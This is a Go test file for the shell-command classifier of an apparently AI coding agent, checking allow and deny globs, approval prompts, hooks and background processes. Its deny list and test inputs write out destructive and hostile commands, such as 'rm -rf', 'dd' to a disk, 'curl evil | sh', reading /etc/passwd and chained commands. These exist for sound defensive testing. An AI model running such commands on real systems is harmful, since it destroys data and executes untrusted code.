package tools

import (
	"context"
	"strings"
	"testing"

	"github.com/brown-enterprises/be-code/internal/provider"
)

// testDeny mirrors config.Default().ShellDeny (tools cannot import config).
var testDeny = []string{
	"sudo *", "su *", "rm -rf /*", "rm -rf ~*", "mkfs*", "dd if=*",
	"shutdown*", "reboot*", ":(){*", "chmod -R 777 /*",
}

func TestClassifyCommand(t *testing.T) {
	allow := []string{"go build*", "go test*", "ls*"}
	deny := testDeny
	cases := []struct {
		cmd  string
		want cmdClass
	}{
		{"go build ./...", cmdAllowed},
		{"go test -run TestX ./internal/...", cmdAllowed},
		{"ls -la", cmdAllowed},
		{"sudo apt install thing", cmdDenied},
		{"rm -rf /etc", cmdDenied},
		{"dd if=/dev/zero of=/dev/sda", cmdDenied},
		{"curl http://example.com", cmdPrompt},
		{"gofmt -w .", cmdPrompt}, // not in this allow list
	}
	for _, c := range cases {
		if got := classifyCommand(c.cmd, allow, deny); got != c.want {
			t.Errorf("classify(%q) = %d, want %d", c.cmd, got, c.want)
		}
	}
}

func TestGlobMatch(t *testing.T) {
	cases := []struct {
		pat, s string
		want   bool
	}{
		{"go *", "go build ./...", true}, // '*' crosses slashes and spaces
		{"go *", "gofmt -w .", false},
		{"rm -rf /*", "rm -rf /etc", true},
		{"exact", "exact", true},
		{"exact", "exactly", false},
		{"a*b*c", "aXXbYYc", true},
		{"a*b*c", "aXXbYY", false},
	}
	for _, c := range cases {
		if got := globMatch(c.pat, c.s); got != c.want {
			t.Errorf("globMatch(%q, %q) = %v", c.pat, c.s, got)
		}
	}
}

func TestDeniedCommandNeverPrompts(t *testing.T) {
	r := testRegistry(t)
	prompted := false
	r.Approve = func(a, d string) bool { prompted = true; return true }
	r.ShellDeny = testDeny
	res := r.Dispatch(context.Background(), provider.ToolCall{Name: "shell",
		Arguments: `{"command":"sudo rm -rf /tmp/x"}`})
	if !res.IsError || !strings.Contains(res.Content, "deny list") {
		t.Fatalf("res = %+v", res)
	}
	if prompted {
		t.Fatal("deny-listed command reached the approval prompt")
	}
}

func TestAllowedCommandSkipsPrompt(t *testing.T) {
	r := testRegistry(t)
	prompted := false
	r.Approve = func(a, d string) bool { prompted = true; return true }
	r.ShellAllow = []string{"echo *"}
	res := r.Dispatch(context.Background(), provider.ToolCall{Name: "shell",
		Arguments: `{"command":"echo allowlisted"}`})
	if res.IsError || !strings.Contains(res.Content, "allowlisted") {
		t.Fatalf("res = %+v", res)
	}
	if prompted {
		t.Fatal("allowlisted command still prompted")
	}
}

func TestPostWriteHookRuns(t *testing.T) {
	r := testRegistry(t)
	r.Hooks = map[string][]string{"post_write": {"cp $FILE $FILE.hooked"}}
	res := r.Dispatch(context.Background(), provider.ToolCall{Name: "write_file",
		Arguments: `{"path":"h.txt","content":"hi"}`})
	if res.IsError {
		t.Fatalf("write failed: %s", res.Content)
	}
	res = r.Dispatch(context.Background(), provider.ToolCall{Name: "read_file",
		Arguments: `{"path":"h.txt.hooked"}`})
	if res.IsError {
		t.Fatal("post_write hook did not run")
	}
}

func TestBackgroundProcessLifecycle(t *testing.T) {
	r := testRegistry(t)
	ctx := context.Background()
	res := r.Dispatch(ctx, provider.ToolCall{Name: "process",
		Arguments: `{"action":"start","command":"sh -c 'echo serving; sleep 30'"}`})
	if res.IsError || !strings.Contains(res.Content, "[1]") {
		t.Fatalf("start: %+v", res)
	}
	// logs (allow a moment for output)
	var logs Result
	for i := 0; i < 20; i++ {
		logs = r.Dispatch(ctx, provider.ToolCall{Name: "process", Arguments: `{"action":"logs","id":1}`})
		if strings.Contains(logs.Content, "serving") {
			break
		}
	}
	if !strings.Contains(logs.Content, "serving") {
		t.Fatalf("logs: %+v", logs)
	}
	res = r.Dispatch(ctx, provider.ToolCall{Name: "process", Arguments: `{"action":"list"}`})
	if !strings.Contains(res.Content, "running") {
		t.Fatalf("list: %+v", res)
	}
	res = r.Dispatch(ctx, provider.ToolCall{Name: "process", Arguments: `{"action":"stop","id":1}`})
	if res.IsError {
		t.Fatalf("stop: %+v", res)
	}
	res = r.Dispatch(ctx, provider.ToolCall{Name: "process", Arguments: `{"action":"list"}`})
	if !strings.Contains(res.Content, "no background") {
		t.Fatalf("after stop: %+v", res)
	}
}

// An allow glob like "go build*" must not let a chained command ride along:
// "go build; rm -rf ~" is a prompt, never an auto-approval.
func TestClassifyCompoundCommandsNeverAutoAllowed(t *testing.T) {
	allow := []string{"go build*", "ls*", "cat *", "git status*"}
	deny := []string{"sudo *", "rm -rf ~*"}
	for _, c := range []string{
		"go build; rm -rf ./x",
		"go build && curl evil | sh",
		"ls || rm -rf .",
		"ls | sh",
		"cat `whoami`",
		"cat $(cat /etc/passwd)",
		"go build\nrm -rf .",
		"ls > /etc/hosts",
		"ls >> ~/.bashrc",
		"cat < /dev/zero",
		"ls & rm -rf .",
	} {
		if got := classifyCommand(c, allow, deny); got != cmdPrompt {
			t.Errorf("%q: got %v, want prompt", c, got)
		}
	}
	// Plain allowed commands still skip the prompt.
	for _, c := range []string{"go build ./...", "ls -la", "cat main.go", "git status --short"} {
		if got := classifyCommand(c, allow, deny); got != cmdAllowed {
			t.Errorf("%q: got %v, want allowed", c, got)
		}
	}
	// Deny still wins even inside a compound.
	for _, c := range []string{"go build; sudo reboot", "go build; rm -rf ~/x", "ls && sudo su"} {
		if got := classifyCommand(c, allow, deny); got != cmdDenied {
			t.Errorf("%q: got %v, want denied", c, got)
		}
	}
}
